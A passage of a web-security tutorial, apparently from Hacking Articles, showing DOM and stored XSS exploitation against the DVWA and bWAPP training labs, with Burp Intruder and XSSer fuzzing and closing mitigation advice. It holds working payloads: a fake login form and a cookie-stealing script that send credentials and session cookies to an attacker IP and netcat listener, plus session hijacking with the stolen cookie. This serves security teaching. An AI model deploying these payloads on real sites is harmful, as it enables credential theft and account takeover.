<p class="MsoNoSpacing"><span style="color: #000000;">– The attacker creates a well-built malicious website</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">– The ingenious user opens that sites</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">– The user has a vulnerable page on his machine</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">– The attacker’s website sends commands to the vulnerable HTML page</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">– The vulnerable local page executes that commands with the user’s privileges on that machine.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">– The attacker easily gains control of the victim computer.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Didn’t understand well, let’s check out a DOM-based XSS exploitation.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">The following application was thereby vulnerable to DOM-based XSS attack. The web application further permits its users to opt a language with the following displayed options and thus executes the input through its URL.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/DVWA/vulnerabilities/xss_d/?default=English</pre>
<p class="MsoNoSpacing"><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-IjaNosA-XaU/XzQDxiAjOVI/AAAAAAAAnCA/55BbHbtacBYFqpZmLBrALblnMnOFZtTqQCLcBGAsYHQ/s1600/14.png"/></span><span style="color: #000000;"> </span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">From the above screenshot, you can see that we do not have any specific section where we could include our malicious code. Therefore, in order to deface this web-application. We’ll now manipulate up the <b style="mso-bidi-font-weight: normal;">“URL”</b> as it is the most common <b style="mso-bidi-font-weight: normal;">source</b> for the <b style="mso-bidi-font-weight: normal;">DOM</b> <b style="mso-bidi-font-weight: normal;">XSS.</b> </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost/DVWA/vulnerabilities/xss_d/?default=English#&lt;script&gt;alert("This is DOM XSS");&lt;/script&gt;</pre>
<p class="MsoNoSpacing"><span class="crayon-ta" style="color: #000000;">After manipulating up the URL, hit enter. Now, <span style="mso-spacerun: yes;"> </span>we’ll again choose up the language and as we fire up the select button, the browser executes up the code in the URL and pops out the <b style="mso-bidi-font-weight: normal;">DOM</b> <b style="mso-bidi-font-weight: normal;">XSS</b> <b style="mso-bidi-font-weight: normal;">alert</b>.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">The major difference between <b style="mso-bidi-font-weight: normal;">DOM-based XSS</b> and <b style="mso-bidi-font-weight: normal;">Reflected</b> or <b style="mso-bidi-font-weight: normal;">Stored XSS</b> is that it cannot be stopped by server-side filters because anything written after the “#” (hash) will never forward to the server.</span></p>
<p class="MsoNoSpacing"><span class="crayon-ta" style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-ESlMGAqGA34/XzQD4S_yWaI/AAAAAAAAnCI/b4ZqpjY6f9UrF2nvgERpEdSedFcMEf16ACLcBGAsYHQ/s1600/15.png"/></span></p>
<h3 class="MsoNoSpacing"><span style="color: #800000;"><span style="font-size: 14pt;">Cross-Site Scripting Exploitation</span></span></h3>
<p class="MsoNoSpacing"><span style="color: #000000;">I’m sure you might be wondering that <i style="mso-bidi-font-style: normal;">“Okay, we got the pop-up, but now what? What we could do with this? I’ll click the OK button and this pop-up will go.”</i></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">But this pop-up speaks about a thousand words. Let’s <b style="mso-bidi-font-weight: normal;">take a U-turn </b>and get back to the place, where we got our first pop-up; Yes over at the Stored Section.</span></p>
<h4 class="MsoNoSpacing"><span style="color: #000000;"><span style="font-size: 14pt;">Credential</span><span style="font-size: 14pt;"> Capturing</span></span></h4>
<p class="MsoNoSpacing"><span style="color: #000000;">So, as we are now aware of the fact that whenever a user submits up his feedback, it will get stored directly into the server’s database. And if the attacker manipulates the feedback with an <b style="mso-bidi-font-weight: normal;">“alert message”,</b> thus even the alert will get stored into it, and it pops up every time, whenever some other user visits the application’s web-page.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">But what, if rather than a pop-up the user is welcomed with a<span style="mso-spacerun: yes;">  </span>login page?</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Let’s try to solve this by injecting a malicious payload that will <em><b><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">create</span></b></em><em><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;"> up a fake user </span></em><strong><i><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">login form </span></i></strong>on the web page. It will thus forward the captured request over to<strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;"> the attacker’s IP</span></strong>.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">So, let’s includes the following script over at the feedback field in the web-application </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;div style="position: absolute; left: 0px; top: 0px; background-color:#fddacd;width: 1900px; height: 1300px;"&gt;&lt;h2&gt;Please login to continue!!&lt;/h2&gt;
&lt;br&gt;&lt;form name="login" action="http://192.168.0.9:4444/login.htm"&gt;
&lt;table&gt;&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="username"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;
&lt;td&gt;&lt;input type="password" name="password"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
&lt;td colspan=2 align=center&gt;&lt;input type="submit" value="Login"/&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/form&gt;</pre>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-o5VMv4rDMe0/XzQEDXvC75I/AAAAAAAAnCQ/ySxhb1NwUZ86ZNCclahmnr4efd9Ew9V5ACLcBGAsYHQ/s1600/16.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Now this malicious code has been stored into the web application’s database.</span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-zdwLhyOeVVA/XzQEKGApsLI/AAAAAAAAnCY/k5dkPP8zVCUvTw-ViylLlEIfZevmMjp-ACLcBGAsYHQ/s1600/17.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Over at some other browser, think when a user tries to submit the feedback.</span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-7SkWYLKYdHU/XzQESj5_W7I/AAAAAAAAnCc/29tPqoPnXNAyosvxgxRfG2Dtu8jZBXvSwCLcBGAsYHQ/s1600/18.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">As soon as she hit the submit button, the browser executes up the script and he got welcomed with login form as <b style="mso-bidi-font-weight: normal;">“Please login to continue!!”</b>.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pXEVP8cTp3w/XzQEmRo3sAI/AAAAAAAAnCs/nhyQGHa3c4U1q2Ip6LrG97KCa5vLQuFtgCLcBGAsYHQ/s1600/19.png"/></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Over on the other side, let’s enable our listener as with</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 4444</pre>
<p class="MsoNoSpacing"><span style="color: #000000;">Now, as when she enters up her credentials, the scripts will boot up again and the entered credentials will travel to the attacker’s listener.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Cool!! From the below screenshot, you can see that we’ve successfully captured up the victim’s credentials. </span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-QSPr6HiZQG4/XzQE0h9L6TI/AAAAAAAAnC0/Qxt1CvQnSKYgzWwou7IGn0y3zQifYklsgCLcBGAsYHQ/s1600/21.png"/></p>
<h4 class="MsoNoSpacing"><span style="color: #000000;"><span style="font-size: 14pt;">Cookie</span><span style="font-size: 14pt;"> Capturing</span></span></h4>
<p class="MsoNoSpacing"><span style="color: #000000;">There are times when an attacker needs <b style="mso-bidi-font-weight: normal;">authenticated</b> <b style="mso-bidi-font-weight: normal;">cookies</b> of a logged-in user either to access his account or for some other malicious purpose. </span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">So let’s see how this XSS vulnerability empowers the attackers to capture the session cookies and how the attacker abuses them in order to get into the user’s account.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">I’ve opened the vulnerable web-application <b style="mso-bidi-font-weight: normal;">“DVWA”</b> over in my browser and logged-in inside with <b style="mso-bidi-font-weight: normal;">admin: password. </b>Further, from the left-hand panel I’ve opted the vulnerability as <b style="mso-bidi-font-weight: normal;">XSS (Stored), </b>over for this time let’s keep the security to <b style="mso-bidi-font-weight: normal;">low</b>.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-yJhY4AtZuoU/XzQE7e2OhGI/AAAAAAAAnC8/g5W0UyzyoIE_i3Cmh6v8rmTXVqKvtV_wQCLcBGAsYHQ/s1600/22.png"/></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Let’s enter our malicious payload over into the “Message” section. But before that, we need to increase the length of text-area as it is not sufficient to inject our payload. Therefore, open up the <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">inspect element tab by hitting <i style="mso-bidi-font-style: normal;">“Ctrl + I”</i></span></strong> to view it’s given message length for the text area and then further change the message <b style="mso-bidi-font-weight: normal;">maxlength</b> <b style="mso-bidi-font-weight: normal;">field</b> from 50 -150.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-KfslZqkCIpg/XzQFE7hYlxI/AAAAAAAAnDI/d4Q7dEu4aUgZYVP43ZQdXfpcu8k2TSI9QCLcBGAsYHQ/s1600/23.png"/></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Over in the following screenshot, you can see that I have injected the script which will thus capture up the cookie and will send the response to our listener when any user visits this page.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">&lt;script&gt;new Image().src="http://192.168.0.9:4444?output="+document.cookie;&lt;/script&gt;</pre>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-3owaLKXQzdg/XzQFMg1CqSI/AAAAAAAAnDQ/2BP9vzT_hdg91AEJ7j29PnZNRuwje5iUACLcBGAsYHQ/s1600/24.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Now, on the other side, let’s set up our Netcat listener as with</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 4444</pre>
<p class="MsoNoSpacing"><span style="color: #000000;"><strong>Logout</strong> and <strong>login again</strong> as a new user or in some other browser. Now, if the user visits the XSS (Stored) page, our listener will thus receive his session cookies.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-7cz4cesmtt4/XzQFU3snqDI/AAAAAAAAnDU/asCdlbNZM5swYaZoeFspfczWY3f03gsqACLcBGAsYHQ/s1600/25.0.png"/></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Great!! From the below screenshot you can see that, we’ve successfully captured up the authenticated cookies.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S0lm22YQ3Tk/XzQFeT9TRsI/AAAAAAAAnDc/XIHn1B-3wxcaZFwEEmdRA_6H1PSxr6KBQCLcBGAsYHQ/s1600/25.png"/></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">But what we could do with them? </span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Let’s try to get into his account. I’ve opened up DVWA again but this time, we won’t log in, rather I’ll get with the captured cookies. I’ve used the <b style="mso-bidi-font-weight: normal;">cookie</b> <b style="mso-bidi-font-weight: normal;">editor</b> plugin in order to manipulate up the session.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">From the below screenshot, you can see that, <b style="mso-bidi-font-weight: normal;">I’ve changed the PHPSESID</b> with the one I captured. And I had manipulated the <b style="mso-bidi-font-weight: normal;">security from impossible to low</b> and even decreased the <b style="mso-bidi-font-weight: normal;">security _level from 1 to 0 </b>and have thus saved up these changes. Let’s even manipulate the URL by removing <b style="mso-bidi-font-weight: normal;">login.php</b> </span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-e0GqXNFd0wQ/XzQFn-e_yBI/AAAAAAAAnDg/qMhz_NRjdKwovL7sxfGJpN-vHYT5VBB-gCLcBGAsYHQ/s1600/26.png"/></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Great!! Now simply reloads the page, from the screenshot you can see are that we are into the application.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X1NQZb2dvb0/XzQFxx3-4tI/AAAAAAAAnDo/FaDRP4HUpMIy7EBSMSGkCBtjZIXiTGZRwCLcBGAsYHQ/s1600/27.png"/></span></p>
<h4 class="MsoNoSpacing"><span style="color: #000000;"><span style="font-size: 14pt;">Exploitation with Burpsuite</span></span></h4>
<p class="MsoNoSpacing"><span style="color: #000000;">Stored XSS is hard to find, but over on the other hand, Reflected XSS is very common and thus can be exploited with some simple clicks.</span></p>
<h5><strong><span style="color: #000000;">Validated Apps</span></strong></h5>
<p class="MsoNoSpacing"><span style="color: #000000;"><i style="mso-bidi-font-style: normal;">But wait, up till now we were only exploiting the web-applications that were not validated by the developers, so what about the restricted ones?</i></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Web applications with the input fields are somewhere or the other vulnerable to XSS. But we can’t exploit them with the bare hands, as they were secured up with some validations. Therefore in order to exploit such validated applications, we need some fuzzing tools and thus for the fuzzing thing, we can count on <b style="mso-bidi-font-weight: normal;">BurpSuite</b>.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">I’ve opened the target IP in my browser and login inside BWAPP as a <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">bee: bug.</span></strong> Further I’ve set the <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">“Choose Your Bug”</span></strong> option to <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">“</span></strong><em><b><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">XSS –Reflected (Post)” </span></b></em>and had fired up the <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">hack button, and for this section, I’ve set the security to “medium”</span></strong> </span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"> <img decoding="async" src="https://1.bp.blogspot.com/-fNwIrTwflVk/XzQF5rqv2FI/AAAAAAAAnDw/iZEZoJPxKDQ-FfsoIwHKogrdXiUZpgwXQCLcBGAsYHQ/s1600/28.png"/></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">From the below screenshot, you can see that when we tried to execute our payload as <b style="mso-bidi-font-weight: normal;">&lt;script&gt;alert(“hello”)&lt;/script&gt;.</b> We hadn’t got our desired result.</span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-NPwW1xh1u-k/XzQGKniAU3I/AAAAAAAAnD4/glR-ABLV4vEtR2GfltDwWpfemOH-bTJiwCLcBGAsYHQ/s1600/29.png"/></p>
<h5><strong><span style="color: #000000;">Capturing Request and Moving to Intruder</span></strong></h5>
<p class="MsoNoSpacing"><span style="color: #000000;">So, let’s capture its ongoing <b style="mso-bidi-font-weight: normal;">HTTP</b> <b style="mso-bidi-font-weight: normal;">Request</b> in our burpsuite and will further share the captured request over to the <b style="mso-bidi-font-weight: normal;">“Intruder”.</b></span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-WQptfvxwVMI/XzQGRj5J4YI/AAAAAAAAnEA/Eb_VLze-MaoCZUXW7Z3WEa3elnMqAWyGwCLcBGAsYHQ/s1600/30.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Over into the <b style="mso-bidi-font-weight: normal;">intruder, </b><span style="mso-spacerun: yes;"> </span>switch to the <b style="mso-bidi-font-weight: normal;">Position</b> <b style="mso-bidi-font-weight: normal;">tab.</b> We’ll configure the position to our input-value parameter as <b style="mso-bidi-font-weight: normal;">“firstname”</b> with the <b style="mso-bidi-font-weight: normal;"><i style="mso-bidi-font-style: normal;">Add $</i> </b>button<b style="mso-bidi-font-weight: normal;">.</b></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><b style="mso-bidi-font-weight: normal;"> <img decoding="async" src="https://1.bp.blogspot.com/-OoPV1oiTzqU/XzQGbDGgSWI/AAAAAAAAnEI/g_HKM1ZAQuk0ZLIL3-gGU9Ov_1HtsEicwCLcBGAsYHQ/s1600/31.png"/></b></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Time to include our payloads file. Click on the <b style="mso-bidi-font-weight: normal;">load</b> button in order to add the dictionary<i style="mso-bidi-font-style: normal;">. You can even opt the burpsuite’s predefined XSS dictionary with a simple click on the <b style="mso-bidi-font-weight: normal;">“Add from list” </b>button and selecting the <b style="mso-bidi-font-weight: normal;">Fuzzing-XSS</b>.</i></span></p>
<h5><span style="color: #000000;"><strong>Launching the Intruder Attack</strong></span></h5>
<p class="MsoNoSpacing"><span style="color: #000000;">As soon as we’re over with the configuration, we’ll fire up the <b style="mso-bidi-font-weight: normal;">“Start Attack”</b> button.</span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-RPL3sv1AVB8/XzQGk3wHOSI/AAAAAAAAnEQ/oeIPZnPL-0smW0_3ydGaFxmg2H-DwDJdQCLcBGAsYHQ/s1600/32.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">You can see from the below image that we have started our attack and that a fluctuation exists in the length section. In order to get the result in the descending order with respect to the length. I’ve double-clicked the length field.</span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-DJQBP7lCDlY/XzQG3Jpp2LI/AAAAAAAAnEc/7ixWhBGGazwE270dzO61WM9RedlQx38bACLcBGAsYHQ/s1600/33.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">We’re almost done, let’s double click on any payload in order to check what it offers.</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">But wait!! We can’t see the XSS result over in the response tab as the browser can only render this malicious code. So in order to check its response let’s <b style="mso-bidi-font-weight: normal;">simply do a right-click</b> and choose the option as <b style="mso-bidi-font-weight: normal;">“Show Response in browser”</b></span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-HLPVTiEQ8oA/XzQHCHdy8CI/AAAAAAAAnEk/_BW4R9yUdJQ_Vz5OMygsVY6zxxJn-Q1igCLcBGAsYHQ/s1600/34.png"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Copy the offered URL and paste it in the browser. Great!! From the below image, you can see that we’ve successfully bypassed the application as we got the <b style="mso-bidi-font-weight: normal;">alert</b>.</span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/-oJwWUYDq02w/XzQHK_1Q5DI/AAAAAAAAnEs/x7sXsR5eY4E6ZslNr0A03Prir5baCNVUgCLcBGAsYHQ/s1600/35.png"/></p>
<h3 class="MsoNoSpacing"><span style="color: #000000;"><span style="font-size: 14pt;">XSSer</span></span></h3>
<p class="MsoNoSpacing"><span style="color: #000000;"><b style="mso-bidi-font-weight: normal;">C</b>ross-<b style="mso-bidi-font-weight: normal;">S</b>ite <b style="mso-bidi-font-weight: normal;">“S</b>cripter<b style="mso-bidi-font-weight: normal;">”</b> or an <b style="mso-bidi-font-weight: normal;">“XSSer” </b>is an automatic framework. It detects <b style="mso-bidi-font-weight: normal;">XSS </b>vulnerabilities over in the web-applications and even provides up several options to exploit them. </span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">XSSer has more than <b>1300</b> pre-installed XSS fuzzing vectors. Which thus empowers the attacker to bypass certainly filtered web-applications and the WAF’s(Web –Application Firewalls).</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">So, let’s see how this fuzzer could help us in exploiting our bWAPP’s web-application. </span></p>
<h5 data-start="656" data-end="684"><strong><span style="color: #000000;">Cloning XSSer on Kali</span></strong></h5>
<p class="MsoNoSpacing"><span style="color: #000000;">But in order to go ahead, we need to clone XSSer into our kali machine, so let’s do it with </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/epsylon/xsser.git</pre>
<p class="MsoNoSpacing"><span style="color: #000000;">Now, boot back into your bWAPP, and set the <b style="mso-bidi-font-weight: normal;">“Choose your Bug”</b> option to <strong><span style="font-family: Calibri, sans-serif;">“</span></strong><em><b><span style="font-family: Calibri, sans-serif;">XSS –Reflected (Get)” </span></b></em><em><span style="font-family: Calibri, sans-serif; font-style: normal;"><span style="mso-spacerun: yes;"> </span>and hit the <b>hack </b>button and for this time we’ll set the security level to <b>“medium”.</b></span></em></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><em><b><span style="font-family: Calibri, sans-serif; font-style: normal;"> <img decoding="async" src="https://1.bp.blogspot.com/-6Q6dTXjckho/XzQHUJN5PqI/AAAAAAAAnE0/JZlhr9bxCD4q9sX93EqQ1PMs7auXSn5GgCLcBGAsYHQ/s1600/99.png"/></span></b></em></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><em><span style="font-family: Calibri, sans-serif; font-style: normal;">XSSer offers us two platforms – the <b>GUI </b>and the <b>Command-Line. </b>Therefore, for this section, we’ll focus on the Command Line method. </span></em></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><em><span style="font-family: Calibri, sans-serif; font-style: normal;">As the <b>XSS</b> <b>vulnerability</b> is <b>dependable</b> on the <b>input</b> <b>parameters</b>, thus this <b>XSSer </b>works on “URL”. And even to get the precise result we need the cookies too. In order to grab both the things, I’ve made a dry run by setting up the <b>firstname</b> as <b>“test” </b>and the <b>lastname </b>as <b>“test1”.</b> </span></em></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-syCywrETTyI/XzQHeWVGmhI/AAAAAAAAnE8/AXAJEQRiXFE_a7XKoGX0VSX8QvIhBcG6ACLcBGAsYHQ/s1600/100.png"/></p>
<h5><span style="color: #000000;">Capturing the Request via Burp Suite</span></h5>
<p class="MsoNoSpacing"><span style="color: #000000;">Now, let’s capture the <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">browser’s request</span></strong> into our burpsuite. By simply enabling the proxy and the intercept options. Further as we hit the <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">Go </span></strong>button, we got the output as</span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><em><span style="font-family: Calibri, sans-serif; font-style: normal;"> <img decoding="async" src="https://1.bp.blogspot.com/-AjI3f_P0cUc/XzQHodliEcI/AAAAAAAAnFE/nEt3wdohQtU7YCZRv00C7TnJ9e0S-JM5wCLcBGAsYHQ/s1600/101.png"/></span></em></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;">Fire up you Kali Terminal with <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">XSSer </span></strong>and run the following command with the <strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">–url </span></strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">and the </span><strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">–cookie flags. </span></strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">Here I’ve even used an –auto flag which will thus check the URL with all the preloaded vectors. Over at the applied URL, we need to manipulate an input-parameter value to “XSS”, as in our case I’ve changed the “test” with “XSS”</span><strong><span style="font-family: 'Calibri',sans-serif; mso-ascii-theme-font: minor-latin; mso-hansi-theme-font: minor-latin; mso-bidi-font-family: 'Times New Roman'; mso-bidi-theme-font: minor-bidi;">.</span></strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 xsser --url "http://192.168.0.9/bWAPP/xss_get.php?firstname=XSS&amp;lastname=test1&amp;form=submit" --cookie "PHPSESSID=q6t1k21lah0ois25m0b4egps85; security_level=1" --auto</pre>
<p class="MsoNoSpacing"><span style="color: #000000;"><strong><span style="font-family: Calibri, sans-serif; font-weight: normal;"> <img decoding="async" src="https://1.bp.blogspot.com/-QqWa9UuO6Jo/XzQHx62L0MI/AAAAAAAAnFM/LzQtWjHT9ywP1BvC9mLDIlX-xlt-VjI_QCLcBGAsYHQ/s1600/102.png"/></span></strong></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><span style="font-family: Calibri, sans-serif;">Oops!! From the below screenshot, you can see that this URL is vulnerable with 1287 vectors. </span></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><strong><span style="font-family: Calibri, sans-serif; font-weight: normal;"> <img decoding="async" src="https://1.bp.blogspot.com/-0hljMGT6p0A/XzQH5nDWZ4I/AAAAAAAAnFQ/DGSeCQJ3PHc0WsNTOYz4UbPxG1UubDVMACLcBGAsYHQ/s1600/104.png"/></span></strong></span></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><span style="font-family: Calibri, sans-serif;">The best thing about this fuzzer is that it provides up the browser’s URL. Select and execute anyone and there you go.</span></span></p>
<h5 class="MsoNoSpacing"><span style="color: #000000;"><span style="font-family: Calibri, sans-serif;"><strong>Note</strong>:</span></span></h5>
<p class="MsoNoSpacing"><span style="color: #000000;"><i style="mso-bidi-font-style: normal;"><span style="font-family: Calibri, sans-serif;">It is not necessary that with every payload, you’ll get the alert pop-up, as every different payload is defined up with some specific event. Whether it is setting up an iframe, capturing up some cookies, or redirection to some other website or something else.<span style="mso-spacerun: yes;">  </span><span style="mso-spacerun: yes;"> </span><span style="mso-spacerun: yes;"> </span></span></i></span><i style="mso-bidi-font-style: normal;"/></p>
<p class="MsoNoSpacing"><span style="color: #000000;"><span style="font-family: Calibri, sans-serif;">Therefore, from the below screenshot, it is clear that we’ve successfully defaced this web-application</span><strong><span style="font-family: Calibri, sans-serif;">.</span></strong></span></p>
<p class="MsoNoSpacing"><img decoding="async" src="https://1.bp.blogspot.com/--dwNcRpyqLs/XzQIC_cu8oI/AAAAAAAAnFY/lqj__0laa-4dIQTqpyPJ8745d2TE7D7WQCLcBGAsYHQ/s1600/105.png"/></p>
<h3 class="MsoNoSpacing"><span style="color: #800000;"><span style="font-size: 14pt;">Mitigation Steps</span></span></h3>
<ul>
<li>Developers should implement a whitelist of allowable inputs. And if that is not possible, they should apply input validations and filter the data entered by the user as much as possible.</li>
<li>Output encoding is the most reliable solution to combat XSS i.e. it takes up the script code and thus converts it into the plain text.</li>
<li>Implement a WAF or a Web Application Firewall to protect the application from XSS attacks.</li>
<li>Use of HTTPOnly Flags on the Cookies.</li>
<li>The developers can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities.</li>
</ul>
<p><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
<h3><strong>Source</strong></h3>
<ul>
<li><strong><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">https://portswigger.net/web-security/cross-site-scripting/dom-based</a></strong></li>
<li><strong><a href="https://www.w3schools.com/">https://www.w3schools.com/</a></strong></li>
</ul>
<p><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a href="https://www.linkedin.com/in/aarti--singh/"> <span style="color: #0000ff;">here</span></a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
